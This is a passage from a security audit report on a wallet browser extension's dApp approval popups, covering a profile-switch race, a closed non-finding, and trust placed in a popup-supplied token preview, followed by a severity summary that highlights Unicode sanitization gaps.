**Title**: When a dApp-approval popup is open (execute / capabilities / discover / verify) and the user switches active profile in the main popup, the windows' `onActiveProfileChanged` watcher calls `reject()` (`execute/index.vue:300-302`, `capabilities/index.vue:167-169`, `discover/index.vue:88-92`). `reject()` calls `rejectViaInteractionService("User rejected")` then `closeWindow(true)` — which uses `chrome.windows.remove(window.id)`. There is no UI-level "wrong profile" overlay shown to the user during the close transition. For a profile switch happening WHILE the popup is mid-approve (network round-trip in flight), the popup window is still on screen showing the OLD profile/account in the signer strip. If the user clicks Confirm in this window, the `approveInteraction` request may have already been short-circuited (post-`reject`) — but the popup body still shows the old profile's account name and an apparently-active "Confirm" button. The `isWrongProfile` overlay exists (`execute/index.vue:158-160`, rendered at `:522-525`) but is only set during `init()`; not at runtime when profile changes after init.

**Impact factors**:
- CIA+A: **Authentication** + **Integrity** (a popup window claiming "Sign in with another profile" UI does not surface; user sees what looks like a stale-but-approveable popup).
- Blast radius: any user with multiple profiles who switches profile while a dApp approval popup is open. Common in multi-tenant workflows.
- Exploitability: AV:Local / AC:Medium / PR:None / UI:Required. Time window: between profile switch and `closeWindow` settling, the user could click Confirm and observe weird UX. The actual transaction does NOT execute against the wrong profile (the SW's `executeAndResolve` at `dapp-interaction/service.ts:140-147` re-validates `payload.session.profileId === active?.id`), so this is a UX-bug-leaning-toward-confusion, not a privilege-escalation. But it weakens the trust posture of the approval surface.

**Evidence confidence**: **medium** — the SW guard works; the popup UI lacks parallel runtime guard but the underlying execution path is safe.

**OWASP / CWE mapping**: **CWE-451** (UI Misrepresentation), **CWE-841** (Improper Enforcement of Behavioral Workflow).

**Trace**:
1. User has profile A active, dApp popup opens for profile A's session.
2. User switches to profile B in main popup. `ProfileService.emit("onActiveProfileChanged", profileB)`.
3. `execute/index.vue:300`: `onActiveProfileChanged = (_profile?: ProfileInfo) => { if (!_profile || _profile.id !== profile.value?.id) reject() }`. → calls `reject()` → calls `rejectViaInteractionService("User rejected")` → calls `closeWindow(true)` → `chrome.windows.remove(window.id)` (`execute/index.vue:376-381`).
4. Between step 3's reject-call and `chrome.windows.remove` actually closing the window, the popup body still renders the profile-A `SignerIdentityStrip` + `DappIdentityBlock` + operations. If the user clicks Confirm DURING this window:
   - `approve()` (`execute/index.vue:317`) runs. `isInteractionCancelled.value` is NOT yet true (the SW's `onInteractionCancelled` event hasn't round-tripped); `isLoading.value` is false.
   - `interactionService.approveInteraction(requestId.value!, executable, ...)` fires.
   - SW receives `approveInteraction(id, ops, origin)` AFTER it received `rejectInteraction(id, "User rejected")` — `rejectInteraction` already deleted the storage entry, so `approveInteraction` throws `"Invalid id"`. Popup catches and shows `setError("Processing error.", "Invalid id")`.

So the actual exploit collapses to "popup shows a confusing error after the user clicks Confirm post-profile-switch." Not an execution-against-wrong-profile because of the SW guard at `service.ts:142-147` (which would fire if `approveInteraction` somehow succeeded but `executeAndResolve` re-checked).

**Missing control**: The popup body itself should render a "wrong profile" overlay synchronously on profile-change watcher firing, instead of relying on the async reject + closeWindow.

**Instances**:
- `packages/extension/src/popup/windows/execute/index.vue:300-302, 370-381` — reject-and-close pattern.
- `packages/extension/src/popup/windows/capabilities/index.vue:167-169, 225-229` — same.
- `packages/extension/src/popup/windows/discover/index.vue:88-92, 116-120` — same.
- `packages/extension/src/popup/windows/verify/index.vue` — DOES NOT have a profile-changed watcher at all; relies on the dappSession lookup throwing on next interaction.

---

### Finding 10 — Cap-popup race: `selectedAccounts` mutated during `approve()` async window between `:disabled` gate and `resolveInteraction` submission

**Title**: `capabilities/index.vue:171-223` `approve()` is invoked on a Button click. The early-return checks `needsAccountSelection.value && selectedAccounts.value.length === 0` (`:184`). Then it spreads `selectedAccounts.value.map(...)` into `resultSelectedAccounts` at `:203` and iterates at `:205-208` for the alias map. Between the `:184` check and the `:203` snapshot, there is NO sync barrier — but Vue's microtask scheduling means there's no JS yield, so this is safe. However, the AccountSelectRow's `:disabled="isLoading || processingError?.type === 'error'"` (`:304`) gates user clicks during the `await interactionService.resolveInteraction(...)` await at `:211`. Critically, `isLoading.value = true` is set at `:189` BEFORE the snapshot at `:203` — so the disabled gate IS active. UI race is contained. **HOWEVER**: `availableAccounts` (`:113`) is set from `payload.params.availableAccounts` — a dApp-supplied list per the wire (`CapabilityParams.availableAccounts`). A malicious dApp providing inflated `availableAccounts` is gated by the dispatcher at `dispatcher.ts:566-575` which OVERWRITES `availableAccounts` from `accountService.getAccounts(profileId, chainId)` — so the dApp's wire value is replaced with the wallet's own list before the popup sees it. Confirmed by reading `dispatcher.ts:566-575`. So the popup CAN trust `availableAccounts`. Status of this finding: **NULL** — popup-side selection accounting is correct; closing as no-finding for documentation.

**Status**: NO_FINDING — verified during audit, included in this report for traceability.

**Evidence**: `packages/wallet-bridge/src/dispatcher.ts:566-575` — wallet overrides `availableAccounts` regardless of wire value.

---

### Finding 11 — `register_token` previewedInterface from popup carries the dApp-supplied chainId AND contract address but execution validates only those two fields, not the on-chain `name` / `symbol` / `decimals`

**Title**: The execute popup at `execute/index.vue:280` calls `previewTokenMetadata` (which DOES read from the actual on-chain contract and returns a `TokenInterface` plus metadata). At approve-time (`:349-355`), the popup attaches this `previewedInterface` to the op:
```ts
if (draft.kind === "register_token") {
  const previewed = tokenInterfaces.value.get(draft.address)
  if (previewed) {
    return { ...draft, previewedInterface: previewed } as unknown as Operation
  }
}
```
The SW `executeRegisterToken` at `execution/service.ts:1085-1108` validates `previewedInterface.contract === op.address` AND `previewedInterface.chainId === network.chainId` — but does NOT re-validate the `name` / `symbol` / `decimals` against a fresh on-chain read. The comment acknowledges this is OK because `previewedInterface` is "extension-internal data" — but the chain of trust is: dApp → popup-side `tokenService.previewTokenMetadata` → contract-on-chain. The user trusts the popup's display. The execution trusts the popup's `previewedInterface`. If the popup is compromised (e.g., a future Vue regression that lets dApp content into the extension popup process — currently no such surface exists, but the comment at `:1088-1091` notes "in case of popup-side bugs"), the popup-attached `previewedInterface.name` / `.symbol` could differ from what the user saw on screen.

Status: **LOW** — defense-in-depth gap. The popup-process is privileged today; this becomes important only on a future regression that breaks popup-process isolation. The fix is cheap: re-run `parseTokenInterface` server-side regardless of `previewedInterface`, OR drop the `previewedInterface` shortcut entirely (one round-trip cost on user-confirmation only).

**Evidence**: `packages/extension/src/wallet/services/execution/service.ts:1085-1108`.

---

## Summary

10 actual findings + 1 no-finding closed during audit.

| # | Title (truncated) | Severity (estimated) |
|---|---|---|
| 1 | Token symbol / name rendered without Unicode sanitization | **HIGH** |
| 2 | dApp `name` rendered without Unicode sanitization | **HIGH** |
| 3 | dApp call.name (function name) rendered through humanize without sanitization | **HIGH** |
| 4 | `aztec_registerContract` artifact.name rendered without sanitization | **MEDIUM** |
| 5 | tokenSymbol leaks into toast strings (Finding 1 follow-on) | **MEDIUM** |
| 6 | DappMetadata.logo type-level XSS hazard (latent — no write path today) | **MEDIUM** (latent) |
| 7 | getRandomHex(16) is 64 bits, not the claimed 128 | **LOW** (defense-in-depth drift) |
| 8 | IncomingTransfer trust-flip vs concurrent-poll race | **MEDIUM** (race, known-deferred per repo memory) |
| 9 | Wrong-profile popup overlay not surfaced at runtime profile switch | **LOW** (UX confusion, no privilege escalation due to SW guard) |
| 11 | `register_token` previewedInterface trusted server-side (defense-in-depth) | **LOW** |

Pattern: the wallet ships `sanitizeWireString` (`capability-meta.ts:155`) and applies it correctly in the capabilities-detail-panel and ScopeAddress surfaces — but the `execute` / `verify` / `discover` / `IncomingTrustPopup` / `DappIdentityBlock` popup surfaces (which are the highest-stakes trust surfaces in the wallet) DO NOT apply it consistently. Three of the top four findings are the same systemic issue: Unicode sanitization gaps on attacker-controlled display strings.
